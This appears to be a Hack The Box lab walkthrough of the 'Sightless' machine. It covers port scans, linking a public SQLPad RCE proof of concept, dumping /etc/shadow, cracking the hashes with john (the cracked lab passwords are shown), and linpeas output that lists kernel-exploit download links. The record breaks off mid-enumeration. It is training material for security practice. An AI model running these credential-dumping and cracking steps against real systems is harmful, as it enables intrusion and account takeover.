---
title: "Sightless"
date: 2024-09-25
slug: "sightless"
tags: ["machines", "sightless", "walkthrough"]
cover: "/images/sightless/Pasted image 20240924122312.png"
summary: "Walkthrough of the Sightless Machines machine covering recon, exploitation, and privilege escalation."
---
Link to [machine](https://app.hackthebox.com/machines/Sightless)

## 1: Nmap


```shell
nmap 10.10.11.32        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 11:32 EEST
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 70.14% done; ETC: 11:33 (0:00:13 remaining)
Nmap scan report for 10.10.11.32
Host is up (0.41s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 34.72 seconds

```

```shell
sudo nmap -sU 10.10.11.32
[sudo] password for hussein: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 11:32 EEST
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 2.65% done; ETC: 11:44 (0:11:38 remaining)
Stats: 0:01:20 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 8.45% done; ETC: 11:47 (0:13:43 remaining)
Stats: 0:03:09 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 13.17% done; ETC: 11:56 (0:20:20 remaining)
Stats: 0:03:55 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 16.58% done; ETC: 11:56 (0:19:22 remaining)
Stats: 0:04:52 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 21.75% done; ETC: 11:55 (0:17:20 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:05:53 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 26.90% done; ETC: 11:54 (0:15:51 remaining)
Stats: 0:07:23 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 34.22% done; ETC: 11:54 (0:14:04 remaining)
Stats: 0:07:44 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 35.92% done; ETC: 11:54 (0:13:41 remaining)
Stats: 0:09:31 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 44.70% done; ETC: 11:54 (0:11:43 remaining)
Stats: 0:12:30 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 60.45% done; ETC: 11:53 (0:08:08 remaining)
Stats: 0:12:31 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 60.55% done; ETC: 11:53 (0:08:07 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:15:48 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 74.05% done; ETC: 11:54 (0:05:31 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:21:04 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 91.48% done; ETC: 11:55 (0:01:57 remaining)
Nmap scan report for 10.10.11.32
Host is up (0.78s latency).
Not shown: 994 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
814/udp   open|filtered unknown
24910/udp open|filtered unknown
31681/udp open|filtered unknown
32775/udp open|filtered sometimes-rpc14
62575/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1378.60 seconds

```

```shell
sudo nmap 10.10.11.32 -p 80 -sV -sC
[sudo] password for hussein: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 12:04 EEST
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for sightless.htb (10.10.11.32)
Host is up (0.99s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Sightless.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.42 seconds

```

```shell
sudo nmap -p 21 -sV -sC 10.10.11.32                        
[sudo] password for hussein: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 12:04 EEST
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.28% done; ETC: 12:05 (0:00:00 remaining)
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.64% done; ETC: 12:05 (0:00:00 remaining)
Nmap scan report for sightless.htb (10.10.11.32)
Host is up (0.49s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| tls-nextprotoneg: 
|_  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=9/24%Time=66F280A4%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20
SF:Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20
SF:try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x
SF:20being\x20more\x20creative\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.12 seconds

```

```shell
sudo nmap sqlpad.sightless.htb -p 80 -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 12:06 EEST
Nmap scan report for sqlpad.sightless.htb (10.10.11.32)
Host is up (0.23s latency).
rDNS record for 10.10.11.32: sightless.htb

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SQLPad
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds

```

## 2: Banner Grabbing


```shell
nc 10.10.11.32 21
220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
```

```shell
nc 10.10.11.32 22
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
```

```shell
curl -I http://10.10.11.32
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 24 Sep 2024 08:42:35 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://sightless.htb/

```


**Map 10.10.11.32 to sightless.htb domain in /etc/hosts**

```shell
curl -I http://sightless.htb/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 24 Sep 2024 08:45:45 GMT
Content-Type: text/html
Content-Length: 4993
Last-Modified: Fri, 02 Aug 2024 10:01:13 GMT
Connection: keep-alive
ETag: "66acae69-1381"
Accept-Ranges: bytes

```

## 3: Inspecting the Web App


```HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="[style.css](view-source:http://sightless.htb/style.css)">
    <title>Sightless.htb</title>
    <link rel="preconnect" href="[https://fonts.googleapis.com](view-source:https://fonts.googleapis.com/)">
    <link rel="preconnect" href="[https://fonts.gstatic.com](view-source:https://fonts.gstatic.com/)" crossorigin>
    <link href="[https://fonts.googleapis.com/css2?family=Fredoka&family=Ubuntu:wght@300&display=swap](view-source:https://fonts.googleapis.com/css2?family=Fredoka&family=Ubuntu:wght@300&display=swap)" rel="stylesheet"> 
    <link rel="stylesheet" href="[https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.0/css/all.min.css](view-source:https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.0/css/all.min.css)" integrity="sha512-10/jx2EXwxxWqCLX/hHth/vu2KY3jCF70dCQB8TSgNjbCVAC/8vai53GfMDrO2Emgwccf2pJqxct9ehpzG+MTw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>
<body>
    <div class="hero">
        <nav>
            <h2 class="logo">Sightless<span>.htb</span></h2>
            <ul>
                <li> <a href="[#](view-source:http://sightless.htb/#)">Home</a></li>
                <li> <a href="[#about](view-source:http://sightless.htb/#about)">About</a></li>
                <li> <a href="[#service](view-source:http://sightless.htb/#service)">Services</a></li>
                <li> <a href="[#contact-me](view-source:http://sightless.htb/#contact-me)">Contact us</a></li>
            </ul>
        </nav>
        <div class="content">
            <h4>Hello,we are</h4>
            <h1> <span>Sightless</span>.htb</h1>
            <h3>We can Help You</h3>
            </div>  

        </div>
    </div>
    <section class="about" id="about">
        <div class="main">
            <img src="[./images/logo.png](view-source:http://sightless.htb/images/logo.png)" alt="">
            <div class="about-text">
                <h2> About Us</h2>
                <h5>Sightless: <span>Empowering Your Digital Backbone</span></h5>
                <p>
Welcome to Sightless, your premier destination for comprehensive database and server management solutions. Founded with a mission to empower businesses with seamless and efficient IT infrastructure, Sightless is dedicated to ensuring your databases and servers are always optimized, secure, and running smoothly.
At Sightless, we understand the critical role that data and server management play in today's digital landscape. Our team comprises seasoned experts with years of experience in database administration, server management, and IT solutions. We pride ourselves on our ability to provide tailored services that meet the unique needs of each client, regardless of size or industry.
		</p>
		<a href="[mailto:sales@sightless.htb](mailto:sales@sightless.htb)" class="btn" style="color:black;"> Get In Touch</a>
            </div>

        </div>
    </section>
    <!----service  section start--->
    <div class="service" >
        <div class="title" id="service">
            <h2>Our Services</h2>
        </div>
        <div class="box">
            <div class="card">
                <i class="fa-brands fa-airbnb"></i>
                <h5>SQLPad</h5>
                <div class="pra">
                <p>SQLPad is a web app that lets users connect to various SQL servers via a browser. Click "Start Now" to try a demo!</p>
                <p style="text-align: center;">
                <a class="button" href="[http://sqlpad.sightless.htb/](view-source:http://sqlpad.sightless.htb/)"> Start Now</a>
                </p>
                </div>
            </div>
            <div class="card">
                <i class="fa-solid fa-microchip"></i>
                <h5>Froxlor</h5>
                <div class="pra">
                <p>Froxlor is Tailored server admin software. Crafted by seasoned admins, it streamlines hosting platform management.</p>
                <p style="text-align: center;">
                <a class="button" href="[https://www.froxlor.org/](view-source:https://www.froxlor.org/)"> Start Now</a>
                </p>
                </div>
            </div>
            <div class="card">
                <i class="fa-solid fa-server"></i>
                <h5>Database & Server Management</h5>
                <div class="pra">
                <p>Providing you the best experience while managing your databases and systems.</p>
                <p style="text-align: center;">
                <a class="button" href="[#contact-me](view-source:http://sightless.htb/#contact-me)"> Start Now</a>
                </p>
                </div>
            </div>
        </div>
    </div>
    <!----Contact us---->
    <div class="contact-me" id="contact-me" style="text-align: center">
    <p>Interested in our services?<br> Click the button below to get in contact with our sales team! </p>
    <a class="button-two" href="[mailto:sales@sightless.htb](mailto:sales@sightless.htb)">Contact Us</a>
    </div>

    <!----Footer strat---->
    <footer>
        <p>Sightless.htb</p>
        <p>Please click on the links below to follow us!</p>
        <div class="social">
            <a href="[#](view-source:http://sightless.htb/#)"><i class="fa-brands fa-facebook"></i></i></a>
            <a href="[#](view-source:http://sightless.htb/#)"><i class="fa-brands fa-instagram"></i></a>
            <a href="[#](view-source:http://sightless.htb/#)"><i class="fa-brands fa-github"></i></a>
        </div>
        <p class="end">CopyRight By Sightless.htb</p>
    </footer>
</body>
</html>
```

found sqlpad.sightless.htb so now we map it in /etc/hosts

Now inspect sqlpad.sightless.htb:
![sightless-1](#missing/Pasted image 20240924115555.png)

## 4: Obtain  a Reverse Shell

4- Playing with SQLpad to create a reverse shell
found a PoC https://github.com/Robocopsita/CVE-2022-0944_RCE_POC

then we run it to obtain RCE
![sightless-1](/images/sightless/Pasted image 20240924122312.png)

Now we have root session

## 5: Find User Flag


```shell
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::

```

```shell
┌──(hussein㉿kali)-[~]
└─$ cat > passwd.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
^C
                                                                                                                                                                                                                                              
┌──(hussein㉿kali)-[~]
└─$ cat > shadow.txt
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
^C

┌──(hussein㉿kali)-[~]
└─$ unshadow passwd.txt shadow.txt > unshadow.txt
                                                                                                                                                                                                                                              
┌──(hussein㉿kali)-[~]
└─$ cat unshadow.txt 
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:*:100:65534::/nonexistent:/usr/sbin/nologin
node:!:1000:1000::/home/node:/bin/bash
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:1001:1001::/home/michael:/bin/bash

```

```shell
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blindside        (root)     
insaneclownposse (michael)     
2g 0:00:01:16 DONE (2024-09-24 12:40) 0.02630g/s 770.9p/s 1292c/s 1292C/s kruimel..galati
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

### Now run linpeas

```shell
./linpeas.sh
./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

  YOU ARE ALREADY ROOT!!! (it could take longer to complete execution)

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 5.15.0-119-generic (buildd@lcy02-amd64-075) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024
User & Groups: uid=0(root) gid=0(root) groups=0(root)
Hostname: c184118df0a6

[-] No network discovery capabilities (fping or ping not found)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 5.15.0-119-generic (buildd@lcy02-amd64-075) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024
lsb_release Not Found

╔══════════╣ Sudo version
sudo Not Found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses

╔══════════╣ Date & uptime
Tue Sep 24 09:41:33 UTC 2024
uptime Not Found

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)

╔══════════╣ Environment
╚ Any private information inside environment variables?
NODE_VERSION=16.14.0
HOSTNAME=c184118df0a6
YARN_VERSION=1.22.17
SHLVL=2
HOME=/root
OLDPWD=/home/michael
_=./linpeas.sh
SQLPAD_PORT=3000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SQLPAD_DB_PATH=/var/lib/sqlpad
PWD=/var/lib/sqlpad
SQLPAD_AUTH_DISABLED_DEFAULT_ROLE=admin
NODE_ENV=production
SQLPAD_AUTH_DISABLED=true

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded


╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found
═╣ AppArmor profile? .............. docker-default (enforce)
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... enabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
╔══════════╣ Container details
═╣ Is this a container? ........... docker
═╣ Any running containers? ........ No
╔══════════╣ Docker Container details
═╣ Am I inside Docker group ....... No
═╣ Looking and enumerating Docker Sockets (if any):
═╣ Docker version ................. Not Found
═╣ Vulnerable to CVE-2019-5736 .... Not Found
═╣ Vulnerable to CVE-2019-13139 ... Not Found
═╣ Vulnerable to CVE-2021-41091 ... Not Found
═╣ Rootless Docker? ............... No


╔══════════╣ Container & breakout enumeration
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
═╣ Container ID ................... c184118df0a6═╣ Container Full ID .............. /
═╣ Seccomp enabled? ............... enabled
═╣ AppArmor profile? .............. docker-default (enforce)
═╣ User proc namespace? ........... enabled         0          0 4294967295
═╣ Vulnerable to CVE-2019-5021 .... No

══╣ Breakout via mounts
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
═╣ /proc mounted? ................. Yes
═╣ /dev mounted? .................. No
═╣ Run unshare .................... No
═╣ release_agent breakout 1........ No
═╣ release_agent breakout 2........ No
═╣ release_agent breakout 3........ 
═╣ core_pattern breakout .......... No
═╣ binfmt_misc breakout ........... No
═╣ uevent_helper breakout ......... No
═╣ is modprobe present ............ No
═╣ DoS via panic_on_oom ........... No
═╣ DoS via panic_sys_fs ........... No
═╣ DoS via sysreq_trigger_dos ..... No
═╣ /proc/config.gz readable ....... No
═╣ /proc/sched_debug readable ..... No
═╣ /proc/*/mountinfo readable ..... No
═╣ /sys/kernel/security present ... Yes
═╣ /sys/kernel/security writable .. No

══╣ Namespaces
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/namespaces
total 0
